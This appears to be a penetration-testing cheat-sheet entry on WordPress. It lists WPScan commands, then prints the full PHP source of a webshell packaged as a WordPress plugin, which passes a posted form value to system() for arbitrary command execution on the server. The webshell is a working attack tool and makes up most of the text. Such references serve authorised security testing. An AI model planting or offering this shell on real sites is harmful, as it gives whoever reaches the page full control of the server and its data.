## WPScan  
`wpscan --url <url>`  
### Using the API
`wpscan --url <url> --api-token <token>`  
### output to file  
`wpscan --url <url> -o <outfile>`  
### Webshells
If you have permission to add or modify a plugin, you can use a webshell plugin, such as the one below.

```
<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
?>
<form action="" method=post>
Command: <input name=c type=text size=100 value="<?php if (isset($_POST["c"])){print(stripslashes($_POST["c"]));} ?>">
<input type=submit>
</form>
<pre>
<?php if (isset($_POST["c"])){system(stripslashes($_POST["c"])." 2>&1");} ?>
</pre>
```
*source*: https://raw.githubusercontent.com/xl7dev/WebShell/master/Php/WordPress%20Shell.php
